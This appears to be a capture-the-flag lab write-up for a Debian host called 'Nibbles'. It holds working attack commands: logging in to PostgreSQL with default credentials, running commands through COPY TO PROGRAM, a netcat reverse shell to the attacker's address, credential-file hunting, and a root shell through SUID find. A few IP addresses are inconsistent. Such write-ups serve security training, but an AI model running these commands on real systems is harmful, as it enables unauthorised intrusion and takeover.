**Metadata**

- IP Address:  92.168.136.47
- Hostname: Nibbles
- OS: Debian GNU/Linux 10 (buster)
- Found Credentials/Users:
	Postgres /
	Wilson /

Main Objectives: Leverage a misconfigured PostgreSQL database server that is listening on all interfaces with default credentials to gain code execution in this lab. Next, exploit misconfigured SUID permissions on the /usr/bin/find binary for privilege escalation. This approach enhances your skills in identifying misconfigurations and escalating privileges effectively.

Local.txt = 9a9e3fca6387f0241f9a7e6cef8ef4c6
Proof.txt = e8a871fe2c892311ba681d801270fd51

**Enumeration**

1. NMAP Scans (TCP/UDP)

```
sudo nmap -sS --top-ports 100 -T4 -Pn --max-retries 1 --min-rate 500 --host-timeout 60s -oA nmap/nmap_fast 192.168.136.47
# Fast scan to start with

PORT    STATE  SERVICE
21/tcp  open   ftp
22/tcp  open   ssh
80/tcp  open   http

sudo nmap -sT -p- -T4 -Pn --max-retries 2 --min-rate 300 -oA nmap/nmap_full 192.168.136.52
# Full

PORT     STATE  SERVICE
21/tcp   open   ftp
22/tcp   open   ssh
80/tcp   open   http
5437/tcp open   pmip6-data

sudo nmap -sC -p 21,22,80,139,445,5437 -T4 -oA nmap/nmap_scripts 192.168.136.47
# Run Scripts on open ports

PORT     STATE  SERVICE
21/tcp   open   ftp
22/tcp   open   ssh
| ssh-hostkey: 
|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)
|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)
|_  256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)
80/tcp   open   http
|_http-title: Enter a title, displayed at the top of the window.
5437/tcp open   pmip6-data

sudo nmap -sU --top-ports 100 -T4 --max-retries 1 --host-timeout 90s -oA nmap/udp_fast 192.168.136.47
# Fast UDP scan

Nmap done: 1 IP address (1 host up) scanned in 27.36 seconds

sudo nmap -sU -p- -T4 --max-retries 0 --min-rate 300 --host-timeout 10m -oA nmap/udp_full 192.168.136.47
# Full UDP Scan

Nmap done: 1 IP address (1 host up) scanned in 219.16 seconds

```

2. Interesting Ports/Services

```
PORT     STATE  SERVICE
21/tcp   open   ftp
22/tcp   open   ssh
80/tcp   open   http
5437/tcp open   pmip6-data
```

3. FTP Enumeration

```
ftp 192.168.136.47
Connected to 192.168.136.47.
220 (vsFTPd 3.0.3)
Name (192.168.136.47:kali): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 

sudo nmap -p 21 --script ftp-* 192.168.136.47
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-17 19:15 MST
NSE: [ftp-brute] usernames: Time limit 10m00s exceeded.
NSE: [ftp-brute] usernames: Time limit 10m00s exceeded.
NSE: [ftp-brute] passwords: Time limit 10m00s exceeded.
Nmap scan report for 192.168.136.47
Host is up (0.078s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 3388 guesses in 603 seconds, average tps: 5.5

Nmap done: 1 IP address (1 host up) scanned in 603.87 seconds


```

4. Web Enumeration 

```
Webserver Info - 

nikto -h http://192.168.136.47     
+ Server: Apache/2.4.38 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Server may leak inodes via ETags, header found with file /, inode: 4f8, size: 5a34020bc5080, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: HEAD, GET, POST, OPTIONS .
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8102 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2025-12-17 19:35:00 (GMT-7) (683 seconds)


gobuster dir -u http://192.168.136.47 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
# Directory brute forcing

/server-status        (Status: 403) [Size: 279]

gobuster dir -u http://192.168.136.47 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,asp,aspx,txt,log,bak,conf,ini,db,json,zip,tar,gz
# Common directories and files

/index.html           (Status: 200) [Size: 1272]

gobuster dir -u http://192.168.136.47 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,asp,aspx,txt,log,bak,conf,ini,db,json,zip,tar,gz
# Files

/index.html           (Status: 200) [Size: 1272]
/page2.html           (Status: 200) [Size: 4115]


```

4. Port 5437

```
- Due to the instructions in the challenge and the fact that 5437 is close to POSTGRES port 5432, attempted to connected via POSTGRES.

- psql -U postgres -p 5437 -h 192.168.136.47 (Used password postgres)

postgres=# \l
                                                     List of databases
   Name    |  Owner   | Encoding | Locale Provider |   Collate   |    Ctype    | Locale | ICU Rules |   Access privileges   
-----------+----------+----------+-----------------+-------------+-------------+--------+-----------+-----------------------
 postgres  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |        |           | 
 template0 | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |        |           | =c/postgres          +
           |          |          |                 |             |             |        |           | postgres=CTc/postgres
 template1 | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |        |           | =c/postgres          +
           |          |          |                 |             |             |        |           | postgres=CTc/postgres
(3 rows)


- template1=# \du
                             List of roles
 Role name |                         Attributes                         
-----------+------------------------------------------------------------
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS



```


6. SMB Port 139, 445 Enumeration

```
smbclient -L //192.168.136.47 -U anonymous
do_connect: Connection to 192.168.136.47 failed (Error NT_STATUS_CONNECTION_REFUSED)

smbmap -H 192.168.136.47

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                                                                      [|] Checking for open ports...                                                                                      [*] Detected 0 hosts serving SMB
[/] Initializing hosts...                                                                                           [-] Closing connections..                                                                                           [\] Closing connections..                                                                                           [|] Closing connections..                                                                                           [/] Closing connections..                                                                                           [-] Closing connections..                                                                                           [*] Closed 0 connections                    

smbclient //192.168.101.110/Backup -N          
Anonymous login successful


```

7. Possible Exploits

```
- Execute code via POSTGRES superuser and obtain reverse shell.
```

8. Other Notes

```

```

**Initial Foothold** 

1. Exploit Steps

```
COPY (SELECT '') TO PROGRAM 'id > /tmp/command_output.txt';
CREATE TABLE temp_table(content text);
COPY temp_table FROM '/tmp/command_output.txt';
SELECT * FROM temp_table;
                                content                                 
------------------------------------------------------------------------
 uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
(1 row)
# Tested ability to run remote code.

template1=# COPY (SELECT '') TO PROGRAM 'mkfifo /tmp/f; nc 192.168.45.187 80 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f';
# Ran reverse shell.

nc -nvlp 80
# Received reverse shell as postgres.

```

2. Shell Access

```
# Linxu shell upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

**Post-Exploitation**

1. Basic System Info

```
# Linux
hostname
nibbles

uname -a
Linux nibbles 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux

cat /etc/os-release 2>/dev/null
PRETTY_NAME="Debian GNU/Linux 10 (buster)"

env
PGLOCALEDIR=/usr/share/locale
LC_MONETARY=C
PWD=/var/lib/postgresql/11/main
LANG=en_US.UTF-8
PG_GRANDPARENT_PID=428
TERM=xterm
SHLVL=1
PGSYSCONFDIR=/etc/postgresql-common
LC_MESSAGES=en_US.UTF-8
LC_CTYPE=en_US.UTF-8
LC_TIME=C
PG_OOM_ADJUST_FILE=/proc/self/oom_score_adj
PGDATA=/var/lib/postgresql/11/main
LC_COLLATE=en_US.UTF-8
LC_NUMERIC=C
_=/usr/bin/env

echo $PATH
/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.

find / -writable -type d 2>/dev/null | head
/run/postgresql
/run/postgresql/11-main.pg_stat_tmp
/run/lock
/tmp
/tmp/.XIM-unix
/tmp/.ICE-unix
/tmp/.X11-unix
/tmp/.Test-unix
/tmp/.font-unix
/var/log/postgresql

find / -perm -4000 -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/find
/usr/bin/sudo
/usr/bin/umount
/usr/bin/su

cat /etc/crontab 2>/dev/null
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

ls -la /etc/cron.*
/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 Apr 27  2020 .
drwxr-xr-x 82 root root 4096 Jul 20  2020 ..
-rw-r--r--  1 root root  102 Jun 23  2019 .placeholder
-rw-r--r--  1 root root  396 Apr  6  2019 sysstat

/etc/cron.daily:
total 48
drwxr-xr-x  2 root root 4096 Apr 27  2020 .
drwxr-xr-x 82 root root 4096 Jul 20  2020 ..
-rwxr-xr-x  1 root root  539 Apr  2  2019 apache2
-rwxr-xr-x  1 root root 1478 May 28  2019 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg
-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate
-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db
-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd
-rw-r--r--  1 root root  102 Jun 23  2019 .placeholder
-rwxr-xr-x  1 root root  383 Sep  2  2019 samba
-rwxr-xr-x  1 root root  441 Apr  6  2019 sysstat

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Apr 27  2020 .
drwxr-xr-x 82 root root 4096 Jul 20  2020 ..
-rw-r--r--  1 root root  102 Jun 23  2019 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Apr 27  2020 .
drwxr-xr-x 82 root root 4096 Jul 20  2020 ..
-rw-r--r--  1 root root  102 Jun 23  2019 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 Apr 27  2020 .
drwxr-xr-x 82 root root 4096 Jul 20  2020 ..
-rwxr-xr-x  1 root root  813 Feb 10  2019 man-db
-rw-r--r--  1 root root  102 Jun 23  2019 .placeholder


crontab -l 2>/dev/null

getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep

ls -l /etc/shadow
-rw-r----- 1 root shadow 1029 Apr 27  2020 /etc/shadow

ls -la /  
drwxr-xr-x  18 root root  4096 Apr 27  2020 .
drwxr-xr-x  18 root root  4096 Apr 27  2020 ..
lrwxrwxrwx   1 root root     7 Apr 27  2020 bin -> usr/bin
drwxr-xr-x   3 root root  4096 May  1  2020 boot
drwxr-xr-x  16 root root  3180 Aug  2  2024 dev
drwxr-xr-x  82 root root  4096 Jul 20  2020 etc
drwxr-xr-x   3 root root  4096 Apr 27  2020 home
lrwxrwxrwx   1 root root    30 Apr 27  2020 initrd.img -> boot/initrd.img-4.19.0-8-amd64
lrwxrwxrwx   1 root root    30 Apr 27  2020 initrd.img.old -> boot/initrd.img-4.19.0-6-amd64
lrwxrwxrwx   1 root root     7 Apr 27  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 27  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 27  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 27  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Apr 27  2020 lost+found
drwxr-xr-x   3 root root  4096 Apr 27  2020 media
drwxr-xr-x   2 root root  4096 Apr 27  2020 mnt
drwxr-xr-x   2 root root  4096 Apr 27  2020 opt
dr-xr-xr-x 120 root root     0 Aug  2  2024 proc
drwx------   4 root root  4096 Dec 17 20:46 root
drwxr-xr-x  22 root root   580 Aug  2  2024 run
lrwxrwxrwx   1 root root     8 Apr 27  2020 sbin -> usr/sbin
drwxr-xr-x   3 root root  4096 Apr 27  2020 srv
dr-xr-xr-x  13 root root     0 Aug  2  2024 sys
drwxrwxrwt  10 root root  4096 Dec 18 14:26 tmp
drwxr-xr-x  13 root root  4096 Apr 27  2020 usr
drwxr-xr-x  13 root root  4096 Apr 27  2020 var
lrwxrwxrwx   1 root root    27 Apr 27  2020 vmlinuz -> boot/vmlinuz-4.19.0-8-amd64
lrwxrwxrwx   1 root root    27 Apr 27  2020 vmlinuz.old -> boot/vmlinuz-4.19.0-6-amd64

```

2. User Enumeration

```
# Linux
whoami
postgres

id
uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)

cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
wilson:x:1000:1000:wilson,,,:/home/wilson:/bin/bash
postgres:x:106:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash


ls -la /home
total 12
drwxr-xr-x  3 root   root   4096 Apr 27  2020 .
drwxr-xr-x 18 root   root   4096 Apr 27  2020 ..
drwxr-xr-x  4 wilson wilson 4096 Jul  9  2020 wilson

sudo -l
Password needed. Tried postgres. Failed.


```

3. Network Information

```
# Linux
ss -tulwn

netstat -tulnp 2>/dev/null
Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   
tcp     LISTEN   0        128              0.0.0.0:5437          0.0.0.0:*      
tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*      
tcp     LISTEN   0        128                 [::]:5437             [::]:*      
tcp     LISTEN   0        128                    *:80                  *:*      
tcp     LISTEN   0        32                     *:21                  *:*      
tcp     LISTEN   0        128                 [::]:22               [::]:*
```

4. Software, Service, and Process Information

```
# Linux
dpkg -l 
busybox

ps aux
root       255  0.0  0.9  40640  9108 ?        Ss   Dec17   0:01 /lib/systemd/sy
root       272  0.0  0.4  22056  5012 ?        Ss   Dec17   0:00 /lib/systemd/sy
root       341  0.0  0.0      0     0 ?        I<   Dec17   0:00 [ttm_swap]
root       344  0.0  0.0      0     0 ?        S    Dec17   0:00 [irq/16-vmwgfx]
root       420  0.0  1.0  48220 10516 ?        Ss   Dec17   0:00 /usr/bin/VGAuth
root       421  0.0  1.1 122876 12064 ?        Ssl  Dec17   0:30 /usr/bin/vmtool
systemd+   423  0.0  0.6  93080  6536 ?        Ssl  Dec17   0:04 /lib/systemd/sy
root       424  0.0  0.6  19304  6368 ?        Ss   Dec17   0:00 /lib/systemd/sy
root       431  0.0  0.4 225824  4408 ?        Ssl  Dec17   0:00 /usr/sbin/rsysl
root       434  0.0  0.2   8504  2736 ?        Ss   Dec17   0:00 /usr/sbin/cron 
message+   435  0.0  0.4   9164  4388 ?        Ss   Dec17   0:00 /usr/bin/dbus-d
root       443  0.0  0.3   6620  3072 ?        Ss   Dec17   0:00 /usr/sbin/vsftp
root       446  0.0  0.7  15852  7140 ?        Ss   Dec17   0:00 /usr/sbin/sshd 
root       453  0.0  0.1   5612  1652 tty1     Ss+  Dec17   0:00 /sbin/agetty -o
postgres   501  0.0  2.6 213456 27064 ?        S    Dec17   0:00 /usr/lib/postgr
root       504  0.0  0.4   8436  4756 ?        Ss   Dec17   0:01 /usr/sbin/apach
postgres   597  0.0  0.6 213556  6088 ?        Ss   Dec17   0:00 postgres: 11/ma
postgres   598  0.0  0.5 213456  5936 ?        Ss   Dec17   0:00 postgres: 11/ma
postgres   599  0.0  0.9 213456  9440 ?        Ss   Dec17   0:00 postgres: 11/ma
postgres   600  0.0  0.6 213996  6476 ?        Ss   Dec17   0:00 postgres: 11/ma
postgres   601  0.0  0.5  68504  5212 ?        Ss   Dec17   0:00 postgres: 11/ma
postgres   602  0.0  0.6 213864  6432 ?        Ss   Dec17   0:00 postgres: 11/ma
root      1549  0.0  0.0      0     0 ?        I    Dec17   0:00 [kworker/u2:0-f
www-data  8333  0.0  0.7 755476  7088 ?        Sl   00:00   0:19 /usr/sbin/apach
www-data  8334  0.0  0.6 755476  6372 ?        Sl   00:00   0:19 /usr/sbin/apach
postgres  9830  0.0  1.8 215340 18648 ?        Ss   14:17   0:00 postgres: 11/ma
postgres  9869  0.0  0.0   2388   696 ?        S    14:26   0:00 sh -c mkfifo /t
postgres  9871  0.0  0.1   2372  1820 ?        S    14:26   0:00 nc 192.168.45.1
postgres  9872  0.0  0.0   2388   752 ?        S    14:26   0:00 /bin/sh
postgres  9898  0.0  0.8  16852  8580 ?        S    14:33   0:00 python3 -c impo
postgres  9899  0.0  0.3   6992  3700 pts/0    Ss   14:33   0:00 /bin/bash
root      9929  0.0  0.0      0     0 ?        I    14:38   0:00 [kworker/0:0-at
root      9965  0.0  0.0      0     0 ?        I    14:43   0:00 [kworker/0:2-at
postgres  9977  0.0  0.3  10916  3260 pts/0    R+   14:46   0:00 ps -aux

ps -ef

```

4. Loot files.

```
# Linux

grep -R "password" /etc 2>/dev/null | head
/etc/apparmor.d/abstractions/authentication:  # databases containing passwords, PAM configuration files, PAM libraries
Binary file /etc/alternatives/rsh matches
Binary file /etc/alternatives/pinentry matches
Binary file /etc/alternatives/rlogin matches
Binary file /etc/alternatives/from matches
/etc/samba/smb.conf:# password with the SMB password when the encrypted SMB password in the
/etc/samba/smb.conf:   unix password sync = yes
/etc/samba/smb.conf:# For Unix password sync to work on a Debian GNU/Linux system, the following
/etc/samba/smb.conf:   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .
/etc/samba/smb.conf:# This boolean controls whether PAM will be used for password changes


ls -la /var/www 2>/dev/null
drwxr-xr-x  3 root root 4096 Apr 27  2020 .
drwxr-xr-x 13 root root 4096 Apr 27  2020 ..
drwxr-xr-x  2 root root 4096 Apr 27  2020 html

find /home -name "*.txt" 2>/dev/null
/home/wilson/local.txt

find /home -type f -name "*history*" 2>/dev/null
/home/wilson/.bash_history

find /home -type f -name "id_rsa" -o -name "id_*" 2>/dev/null

grep -Ri "password\|passwd\|secret\|token\|key" /home 2>/dev/null | head

find / -name "*.bak" -o -name "*~" 2>/dev/null | head
/var/backups/shadow.bak
/var/backups/passwd.bak
/var/backups/gshadow.bak
/var/backups/group.bak
/var/lib/apt/cdroms.list~
/etc/apt/sources.list~

ls -la /var/backups
total 560
drwxr-xr-x  2 root root     4096 Dec 18 06:25 .
drwxr-xr-x 13 root root     4096 Apr 27  2020 ..
-rw-r--r--  1 root root    71680 Dec 18 06:25 alternatives.tar.0
-rw-r--r--  1 root root    14293 May  1  2020 apt.extended_states.0
-rw-r--r--  1 root root     1500 Apr 27  2020 apt.extended_states.1.gz
-rw-r--r--  1 root root      252 Apr 27  2020 dpkg.diversions.0
-rw-r--r--  1 root root      135 Apr 27  2020 dpkg.statoverride.0
-rw-r--r--  1 root root   443185 May  1  2020 dpkg.status.0
-rw-------  1 root root      816 Apr 27  2020 group.bak
-rw-------  1 root shadow    687 Apr 27  2020 gshadow.bak
-rw-------  1 root root     1578 Apr 27  2020 passwd.bak
-rw-------  1 root shadow   1029 Apr 27  2020 shadow.bak
cat /var/backups/passwd.bak
cat: /var/backups/passwd.bak: Permission denied


/var/www/html$ ls -la
ls -la
total 300
drwxr-xr-x 2 root root   4096 Apr 27  2020 .
drwxr-xr-x 3 root root   4096 Apr 27  2020 ..
-rw-r--r-- 1 root root   1272 Apr 14  2020 index.html
-rw-r--r-- 1 root root 231234 Apr 14  2020 nightmare.jpg
-rw-r--r-- 1 root root   4115 Apr 14  2020 page2.html
-rw-r--r-- 1 root root  49944 Apr 14  2020 pic.png
postgres@nibbles:/var/www/html$ touch test
touch test
touch: cannot touch 'test': Permission denied

```

5. Automated Enumeration

```
Sudo version 1.8.27                                                                  
-rw-r--r-- 1 root root 8629 Apr 27  2020 /etc/samba/smb.conf
                                                                             logon script = logon.cmd
   
   
   create mask = 0700
   directory mask = 0700
;   guest ok = yes
                                            

SUID
-rwsr-xr-x 1 root root 309K Feb 16  2019 /usr/bin/find

Files inside others home (limit 20)
/home/wilson/.bash_logout                                                                                                                                                                                          
/home/wilson/.bash_history
/home/wilson/.profile
/home/wilson/local.txt
/home/wilson/.bashrc
/root/.local/share/nano/search_history
/root/proof.txt
/root/.bash_history
/root/.profile
/root/.bashrc
/var/www/html/index.html
/var/www/html/nightmare.jpg
/var/www/html/page2.html
/var/www/html/pic.png


```
5. Possible PE Paths

```
SUID
-rwsr-xr-x 1 root root 309K Feb 16  2019 /usr/bin/find


```

**Privilege Escalation**

1. PE Steps

```
/usr/bin/find . -exec /bin/sh -p \; -quit

```

2. Notes

```

```

